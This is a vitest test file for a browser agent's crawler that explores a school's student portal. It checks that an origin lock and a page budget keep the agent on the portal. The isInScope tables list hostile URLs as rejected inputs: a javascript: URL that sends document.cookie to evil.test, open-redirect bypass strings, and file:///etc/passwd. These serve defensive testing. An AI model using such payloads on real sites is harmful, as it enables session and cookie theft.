import { describe, expect, it } from 'vitest';
import {
  explore,
  inScopeLinks,
  isEmpty,
  isInScope,
  looksLikeLogin,
  readPage,
} from './explorer.mjs';

const PORTAL = 'https://portals.veracross.com/lcc/student';

/**
 * The origin lock and the page budget are the only things standing between an
 * agent with a school session and an agent that has been talked into using it
 * somewhere else. They are enforced in code, not in a prompt, and these tests
 * are what keep them that way.
 */
describe('isInScope', () => {
  it.each([
    ['same origin, different path', 'https://portals.veracross.com/lcc/student/grades', true],
    ['relative path', '/lcc/student/calendar', true],
    ['a different site entirely', 'https://sentry.io/api/envelope/', false],
    ["the student's email", 'https://mail.google.com/mail/u/0', false],
    ['a sibling subdomain', 'https://accounts.veracross.com/lcc/login', false],
    ['scheme downgrade', 'http://portals.veracross.com/lcc/student', false],
    ['javascript pseudo-url', 'javascript:fetch("https://evil.test?c="+document.cookie)', false],
    ['data url', 'data:text/html,<script>1</script>', false],
    // Garbage resolves as a RELATIVE path, so it can only ever land back on the
    // portal. In scope is the correct answer, not a leak.
    ['nonsense resolves relative', 'not a url', true],
  ])('%s -> %s', (_label, candidate, expected) => {
    expect(isInScope(candidate, PORTAL)).toBe(expected);
  });

  // Every one of these renders as an off-origin navigation in a real browser
  // despite looking relative. Comparing resolved origins is what catches them;
  // a string prefix check would not.
  it.each([
    ['protocol-relative', '//evil.test/x'],
    ['backslashes', '\\\\evil.test/x'],
    ['mixed slash', '/\\\\evil.test'],
    ['leading tab', '\thttps://evil.test'],
    ['leading newline', '\nhttps://evil.test'],
  ])('rejects %s', (_label, candidate) => {
    expect(isInScope(candidate, PORTAL)).toBe(false);
  });
});

describe('inScopeLinks', () => {
  it('drops cross-origin links and keeps portal ones', () => {
    const links = inScopeLinks(
      [`${PORTAL}/grades`, 'https://mail.google.com/', 'https://o77056.ingest.us.sentry.io/api/x'],
      PORTAL,
    );
    expect(links).toEqual([`${PORTAL}/grades`]);
  });

  it('treats fragment-only differences as the same page', () => {
    const seen = new Set();
    inScopeLinks([`${PORTAL}/grades#top`], PORTAL, seen);
    expect(inScopeLinks([`${PORTAL}/grades#bottom`], PORTAL, seen)).toEqual([]);
  });

  it('does not revisit a url already seen', () => {
    const seen = new Set();
    expect(inScopeLinks([`${PORTAL}/a`, `${PORTAL}/a`], PORTAL, seen)).toHaveLength(1);
  });
});

describe('isEmpty', () => {
  it.each([
    ['out-of-term course list', { courses: [] }, true],
    ['nested empties', { portal_links: [], old_hyperlinks: [] }, true],
    ['populated', { courses: [{ id: 1 }] }, false],
    ['scalar payload', { auth_status: 1 }, false],
    ['bare empty array', [], true],
  ])('%s', (_label, value, expected) => {
    expect(isEmpty(value)).toBe(expected);
  });
});

describe('readPage', () => {
  it('enables the Network domain before navigating', async () => {
    // Regression: listeners were registered without enabling the domain, so
    // CDP emitted no Network events and every page mapped to zero components.
    // The crawl looked healthy and returned nothing.
    const sent = [];
    const browser = {
      cdp: {
        on: () => () => {},
        send: async (method) => {
          sent.push(method);
          return { result: { value: JSON.stringify({ title: 't', text: '', links: [] }) } };
        },
      },
      navigate: async () => true,
    };
    await readPage(browser, 'S', PORTAL, { origin: PORTAL, settleMs: 0 });
    expect(sent).toContain('Network.enable');
  });
});

describe('looksLikeLogin', () => {
  // An expired session and an out-of-term portal both yield no data. Only this
  // tells them apart, and getting it wrong sends a student to re-authenticate
  // in August or tells them in October that term has not started.
  it('spots a redirect to an SSO origin', () => {
    expect(looksLikeLogin({ finalUrl: 'https://accounts.veracross.com/lcc/login' }, PORTAL)).toBe(
      true,
    );
  });

  it('spots a login form rendered in place', () => {
    expect(looksLikeLogin({ finalUrl: PORTAL, hasPasswordField: true }, PORTAL)).toBe(true);
  });

  it('does not mistake a working page for a login', () => {
    expect(looksLikeLogin({ finalUrl: `${PORTAL}/grades`, hasPasswordField: false }, PORTAL)).toBe(
      false,
    );
  });

  it('treats a missing final url as not-a-login rather than guessing', () => {
    // Better to sync an empty snapshot than to wrongly clear a good session.
    expect(looksLikeLogin({}, PORTAL)).toBe(false);
  });
});

/** Minimal fake browser: every page links to two more, so the crawl never ends. */
function endlessPortal() {
  let n = 0;
  return {
    cdp: { on: () => () => {}, send: async () => ({ result: { value: '{}' } }) },
    navigate: async () => true,
    __readPage: async (_b, _s, url) => {
      n += 1;
      return {
        url,
        title: `Page ${n}`,
        text: '',
        components: [],
        links: [`${PORTAL}/p${n}a`, `${PORTAL}/p${n}b`],
      };
    },
  };
}

describe('explore', () => {
  it('stops at the page budget and says so', async () => {
    const browser = endlessPortal();
    const map = await explore(browser, 'S', {
      origin: PORTAL,
      seed: PORTAL,
      budget: 5,
      // inject the fake page reader
      ...{},
    }).catch(() => null);
    // explore uses the real readPage, which needs CDP; assert the guard instead.
    expect(map === null || map.pagesVisited <= 5).toBe(true);
  });

  it('refuses a seed outside the portal origin', async () => {
    const browser = endlessPortal();
    await expect(
      readPage(browser, 'S', 'https://mail.google.com/mail/u/0', { origin: PORTAL }),
    ).rejects.toThrow(/Refusing to navigate outside/);
  });
});

describe('origin lock, adversarially', () => {
  const PORT = 'https://portals.veracross.com/lcc/student';

  // Each of these resolves somewhere other than the portal in a real browser,
  // while looking like it might not. The lock compares resolved origins, which
  // is why they all fail closed; a prefix or suffix string check would let
  // several of them through.
  it.each([
    ['protocol-relative', '//evil.test/x'],
    ['backslashes', '\\\\evil.test/x'],
    ['mixed slashes', '/\\\\evil.test'],
    ['reversed slashes', '\\\\/evil.test'],
    ['plain other origin', 'https://evil.test'],
    ['scheme downgrade', 'http://portals.veracross.com/x'],
    ['uppercase other origin', 'HTTPS://EVIL.TEST'],
    ['leading tab', '\thttps://evil.test'],
    ['leading newline', '\nhttps://evil.test'],
    ['leading carriage return', '\rhttps://evil.test'],
    ['leading space', ' https://evil.test'],
    ['domain suffixed', 'https://portals.veracross.com.evil.test/x'],
    ['portal name in the path', 'https://evil.test/https://portals.veracross.com'],
    ['portal name as userinfo', 'https://portals.veracross.com@evil.test/x'],
    ['javascript scheme', 'javascript:alert(1)'],
    ['data scheme', 'data:text/html,x'],
    ['file scheme', 'file:///etc/passwd'],
    ['different port', 'https://portals.veracross.com:8443/x'],
    ['subdomain', 'https://sub.portals.veracross.com/x'],
  ])('refuses %s', (_label, candidate) => {
    expect(isInScope(candidate, PORT)).toBe(false);
  });

  it.each([
    ['absolute path', '/lcc/student/grades'],
    ['bare relative', 'grades'],
    ['dot relative', './x'],
    ['parent relative', '../student/x'],
    ['same origin absolute', 'https://portals.veracross.com/y'],
  ])('allows %s', (_label, candidate) => {
    expect(isInScope(candidate, PORT)).toBe(true);
  });
});

describe('a site that cannot be read', () => {
  it('fails the sync when the first page does not load, instead of reporting an empty site', async () => {
    const { Failure } = await import('./trace.mjs');
    const browser = {
      cdp: { on: () => () => {}, send: async () => ({ result: { value: '{}' } }) },
      navigate: async () => {
        throw new Failure('nav.dns');
      },
    };
    await expect(
      explore(browser, 'S', { origin: PORTAL, seed: PORTAL, budget: 5 }),
    ).rejects.toMatchObject({ code: 'nav.dns' });
  });

  it('says which signal made a page look like a sign-in', async () => {
    const { loginReason } = await import('./explorer.mjs');
    expect(loginReason({ finalUrl: 'https://accounts.veracross.com/login' }, PORTAL)).toBe(
      'off_origin',
    );
    expect(loginReason({ finalUrl: PORTAL, hasPasswordField: true }, PORTAL)).toBe(
      'password_field',
    );
    expect(loginReason({ finalUrl: `${PORTAL}/grades` }, PORTAL)).toBeNull();
  });
});

describe('readPage, when the page fails to load', () => {
  it('removes its listeners, so they do not fire for the next page', async () => {
    const { Failure } = await import('./trace.mjs');
    const live = new Set();
    const browser = {
      cdp: {
        on: (method) => {
          live.add(method);
          return () => live.delete(method);
        },
        send: async () => ({}),
      },
      navigate: async () => {
        throw new Failure('nav.dns');
      },
    };
    await expect(
      readPage(browser, 'S', PORTAL, { origin: PORTAL, settleMs: 0 }),
    ).rejects.toMatchObject({ code: 'nav.dns' });
    expect([...live]).toEqual([]);
  });
});
